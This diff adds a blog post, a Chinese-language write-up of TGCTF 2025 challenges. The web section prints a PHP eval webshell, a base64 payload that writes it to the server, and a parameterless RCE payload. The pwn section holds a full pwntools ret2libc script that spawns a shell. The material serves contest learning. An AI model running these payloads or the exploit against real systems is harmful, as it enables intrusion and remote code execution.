@@ -1,0 +1,411 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TGCTF 2025 WriteUp | k0relapseの次元囚笼</title><meta name="author" content="k0relapse"><meta name="copyright" content="k0relapse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="好运来~祝你好运来~~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TGCTF 2025 WriteUp">
+<meta property="og:url" content="https://k0re.xyz/2025/04/13/TGCTF%20Writeup/index.html">
+<meta property="og:site_name" content="k0relapseの次元囚笼">
+<meta property="og:description" content="好运来~祝你好运来~~">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k0re.xyz/resources/images/ArticleTopImages/TGCTF2025.webp">
+<meta property="article:published_time" content="2025-04-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-23T09:36:27.662Z">
+<meta property="article:author" content="k0relapse">
+<meta property="article:tag" content="Competition">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k0re.xyz/resources/images/ArticleTopImages/TGCTF2025.webp"><link rel="shortcut icon" href="/img/avatar3_512_round.webp"><link rel="canonical" href="https://k0re.xyz/2025/04/13/TGCTF%20Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TGCTF 2025 WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><link rel="stylesheet" type="text/css" href="/css/custom.css"><link rel="stylesheet" type="text/css" href="/css/cur.css"><link rel="stylesheet" type="text/css" href="/css/background.css"><link rel="stylesheet" type="text/css" href="/css/loading_avatar.css"><link rel="stylesheet" type="text/css" href="/css/music_color_theme.css"><link rel="stylesheet" type="text/css" href="/css/aplayer.css"><link rel="stylesheet" href="/css/copyright.css"><link rel="stylesheet" type="text/css" href="/css/twikoo_beautify.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background: url;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar3_1024.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/resources/images/ArticleTopImages/TGCTF2025.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar3_512_round.webp" alt="Logo"><span class="site-name">k0relapseの次元囚笼</span></a><a class="nav-page-title" href="/"><span class="site-name">TGCTF 2025 WriteUp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> Gallery</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">TGCTF 2025 WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-12T16:00:00.000Z" title="Created 2025-04-13 00:00:00">2025-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-23T09:36:27.662Z" title="Updated 2025-04-23 17:36:27">2025-04-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Articles/">Articles</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>5mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/2025/04/13/TGCTF%20Writeup/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>TGCTF 2025 WriteUp</h1>
+<hr>
+<p>做的很舒服的一次 CTF ，终于是新生赛不是新神赛了555</p>
+<p>web 和 pwn 简单题挺多的，不过这次主要是做的 misc 多拿点分。</p>
+<p>最后只能勉强守住前百，拼尽全力无法战胜…</p>
+<hr>
+<h2 id="Web">Web</h2>
+<h3 id="AAA偷渡阴平">AAA偷渡阴平</h3>
+<p>简单的无参数 RCE 即可绕过并 getshell 。</p>
+<p>payload ： <code>?tgctf2025=eval(end(current(get_defined_vars())));&amp;rce=system(&quot;cat%20/flag&quot;);</code></p>
+<h3 id="火眼辩魑魅">火眼辩魑魅</h3>
+<p>访问 <code>robots.txt</code> 拿到目标信息；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Disallow: tgupload.php</span><br><span class="line">Disallow: tgshell.php</span><br><span class="line">Disallow: tgxff.php</span><br><span class="line">Disallow: tgser.php</span><br><span class="line">Disallow: tgphp.php</span><br><span class="line">Disallow: tginclude.php</span><br></pre></td></tr></table></figure>
+<p>这里选择看着顺眼的 <code>tgshell.php</code> 下手。</p>
+<p><code>highlight_file(&quot;./tgshell.php&quot;);</code> 拿源码审计。</p>
+<p>可以发现只是过滤了些可以直接 getshell 的函数，但这并不影响我们传一个🐎上去。</p>
+<p>一句话木马：<code>&lt;?php eval(@$_POST['rce']);?&gt;</code></p>
+<p>payload: <code>echo(file_put_contents(&quot;shell.php&quot;, base64_decode(&quot;PD9waHAgZXZhbChAJF9QT1NUWydyY2UnXSk7Pz4=&quot;)));</code></p>
+<p>蚁剑 Getshell 即可。</p>
+<h3 id="直面天命">直面天命</h3>
+<p>查看源码，提示我们访问 <code>/hint</code> 路由。</p>
+<p>访问后告诉我们要爆破一个路由，yakit 写一段反向正则爆破即可。</p>
+<p>爆破出来 <code>/aazz</code> 路由，继续查看源码是可以发现提示我们传参的 hint 。</p>
+<p>拿 arjun 爆破一下参数：</p>
+<p><img src="/resources/images/tgctf2025/1.webp" alt=""></p>
+<p><code>filename</code> 参数，猜测是文件读取。</p>
+<p>直接读取 <code>/flag</code> 即可。</p>
+<hr>
+<h2 id="Misc">Misc</h2>
+<h3 id="这是啥o-o">这是啥o_o</h3>
+<p>一个 GIF 。</p>
+<p>帧提取一下，可以在后面几帧发现被分尸九段的汉信码。</p>
+<p>因为图片尺寸不对，脚本截取一下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">Image.MAX_IMAGE_PIXELS = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">input_folder = <span class="string">&quot;./qr/&quot;</span></span><br><span class="line"></span><br><span class="line">output_folder = <span class="string">&quot;output_images&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.makedirs(output_folder, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(input_folder):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename.lower().endswith(<span class="string">&quot;.png&quot;</span>):</span><br><span class="line"></span><br><span class="line">        input_path = os.path.join(input_folder, filename)</span><br><span class="line">        output_path = os.path.join(output_folder, filename)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> Image.<span class="built_in">open</span>(input_path) <span class="keyword">as</span> img:</span><br><span class="line">            cropped_img = img.crop((<span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">38</span>))</span><br><span class="line">            cropped_img.save(output_path)</span><br></pre></td></tr></table></figure>
+<p>随后拼接即可。</p>
+<p><img src="/resources/images/tgctf2025/hanxin.webp" alt="time is your fortune ,efficiency is your life"></p>
+<p>不过扫描出来可以发现并不是 flag , 而是一段 hint 。</p>
+<p>思考一下，可以发现这段 hint 其实指向的是 GIF 时间隐写，即在 GIF 图每一帧的播放时间上动手脚。</p>
+<p>对应字节是 010 GIF 模板上的 Delay Time 标记。</p>
+<p>使用 010 手动看对应字节提取出来即可。</p>
+<h3 id="ez-zip">ez_zip</h3>
+<p>嵌套 zip 。</p>
+<p>第一层是弱密码爆破，8位纯数字， AZCHPR 爆破即可。</p>
+<p>第二层是明文攻击，注意到压缩包的压缩方式是 ZipCrypto Deflate , 同时本层与下一层的zip压缩包中都含有 <code>sh512.txt</code> , 只是长度不同。根据 <code>sh512</code> 语义不难猜到下一层压缩包内的 txt 文本内容是本层文本的 sha512 。 长度也为 128 位刚好对的上。使用windows自带标准压缩，保证文件目录结构相同，压缩完成比对 CRC 相同， AZCHPR 明文攻击即可。</p>
+<p>第三层则是压缩包修复，这部分没有什么好讲的，发现 zipfilerecord 段被删除了一点，这里直接放出前后 HEX 比对。</p>
+<p><img src="/resources/images/tgctf2025/2.webp" alt=""></p>
+<p><img src="/resources/images/tgctf2025/3.webp" alt=""></p>
+<p>修复完成即可得到 flag 。</p>
+<h3 id="你能发现图中的秘密吗？">你能发现图中的秘密吗？</h3>
+<p>这道题中途改了一次题，浪费了半天时间。</p>
+<p>只记得第一次的题是每 10 个像素塞了一个点，写个脚本提取出来即可，似曾相识。</p>
+<p>最后的题目是一个套题，先是可以利用 Stegsolve 在 R0 通道发现隐写，得到压缩包的密码 <code>key=i_1ove_y0u</code></p>
+<p>解压后得到一段 flag ，还有一段 flag 被 IDAT 隐写在了另一个图片文件里。</p>
+<p>提取出来，可以发现这一段 IDAT 是 <code>78 9C</code> 开头，大概是另一张图片的 IDAT 块数据。</p>
+<p>给这段 IDAT 补齐其他 PNG 段，不过我们并不知道宽高，所以此时还是无法得到 flag 。</p>
+<p>众嗦粥汁，高并不会影响 png 的可读性，我们只需要得到宽即可。</p>
+<p>观察宽高错误的图片，其实可以发现图片的后半段有颜色的像素是有规律的出现的，我们获取相邻两个像素的间隔。利用画图数一下毛计算一下即可得知宽度是 1500px 。</p>
+<p>改宽度，读取，得到 flag 。</p>
+<h3 id="where-it-is-osint">where it is(osint)</h3>
+<p>osint 就不好说了，大概是截取中间一段图片，百度识图一下，可以发现是 tw 省的一所学校，搜这所学校的官网，可以得到这个学校的地址是某段路的 520 号.</p>
+<p>不过我们直接搜高德地图是搜不出来的，只能搜到同一个路的 300 多号和 700 多号，那么学校肯定在这中间。</p>
+<p>题目问的是学校附近的 地铁(?) 站，在区间内有一个 西湖站 和 港墘站 ，答案是港墘站。</p>
+<h2 id="Pwn">Pwn</h2>
+<h3 id="Signin">Signin</h3>
+<p>简简单单脚本一把梭。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level = &#x27;Debug&#x27;, arch = &#x27;amd64&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node1.tgctf.woooo.tech&quot;</span>, <span class="number">30602</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000401176</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plt:<span class="subst">&#123;<span class="built_in">hex</span>(puts_plt)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;plt:<span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 puts 的地址并返回 main 函数方便打第二个 payload</span></span><br><span class="line">leak = flat([<span class="string">b&#x27;A&#x27;</span> * offset, ret, rdi, puts_got, puts_plt, start])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;please leave your name.\n&quot;</span>, leak)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到 system 和 /bin/sh 的真实地址</span></span><br><span class="line">puts_addr =  u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* offset + p64(ret)+ p64(rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;please leave your name.\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>TGCTF 2025 WriteUp</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://k0re.xyz/2025/04/13/TGCTF%20Writeup/">https://k0re.xyz/2025/04/13/TGCTF%20Writeup/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a" style="display: inline-block;width: 120px"><h>Author</h><div class="post-copyright-cc-info"><h>k0relapse</h></div></div><div class="post-copyright-c" style="display: inline-block;width: 120px"><h>Created</h><div class="post-copyright-cc-info"><h>2025-04-13</h></div></div><div class="post-copyright-u" style="display: inline-block;width: 120px"><h>Updated</h><div class="post-copyright-cc-info"><h>2025-04-23</h></div></div><div class="post-copyright-c" style="display: inline-block;width: 120px"><h>Copyright</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Competition/">Competition</a></div><div class="post-share"><div class="social-share" data-image="/resources/images/ArticleTopImages/TGCTF2025.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/03/14/%E6%A0%A1%E5%9B%AD%E7%BD%91/" title="实现 srun 校园网的远程认证登录"><img class="cover" src="/resources/images/ArticleTopImages/srun_Yoruko.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">实现 srun 校园网的远程认证登录</div></div><div class="info-2"><div class="info-item-1">自己买的腐乳臭豆腐要自己吃哦</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/10/HGAME%202025%20WriteUp/" title="HGAME 2025 WriteUp"><img class="cover" src="/resources/images/ArticleTopImages/HGAME2025.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-10</div><div class="info-item-2">HGAME 2025 WriteUp</div></div><div class="info-2"><div class="info-item-1">打 HGAME 比赛，享 HGAME 人生</div></div></div></a><a class="pagination-related" href="/2025/01/20/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%20WriteUp/" title="春秋杯 2024 冬季 WriteUp"><img class="cover" src="/resources/images/ArticleTopImages/cqb2024_winter_Himari.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-20</div><div class="info-item-2">春秋杯 2024 冬季 WriteUp</div></div><div class="info-2"><div class="info-item-1">🥬🐶传奇之惨遭暴打</div></div></div></a><a class="pagination-related" href="/2024/12/10/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E8%B5%9B%202024%20%E5%AE%9E%E8%B7%B5%E8%B5%9BWriteUp/" title="强网青少 2024 创新赛 WriteUp"><img class="cover" src="/resources/images/ArticleTopImages/qwb_qs-cx_2024.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">强网青少 2024 创新赛 WriteUp</div></div><div class="info-2"><div class="info-item-1">🥬🐶传奇之痛失二等</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div><div class="comment-switch"><span class="first-comment">Twikoo</span><span id="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar3_1024.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">k0relapse</div><div class="author-info-description">Down the Rabbit-Hole...</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/k0relapse"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">TGCTF 2025 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3"><span class="toc-number">1.1.1.</span> <span class="toc-text">AAA偷渡阴平</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%9C%BC%E8%BE%A9%E9%AD%91%E9%AD%85"><span class="toc-number">1.1.2.</span> <span class="toc-text">火眼辩魑魅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E9%9D%A2%E5%A4%A9%E5%91%BD"><span class="toc-number">1.1.3.</span> <span class="toc-text">直面天命</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5o-o"><span class="toc-number">1.2.1.</span> <span class="toc-text">这是啥o_o</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-zip"><span class="toc-number">1.2.2.</span> <span class="toc-text">ez_zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E5%8F%91%E7%8E%B0%E5%9B%BE%E4%B8%AD%E7%9A%84%E7%A7%98%E5%AF%86%E5%90%97%EF%BC%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">你能发现图中的秘密吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#where-it-is-osint"><span class="toc-number">1.2.4.</span> <span class="toc-text">where it is(osint)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Signin"><span class="toc-number">1.3.1.</span> <span class="toc-text">Signin</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div 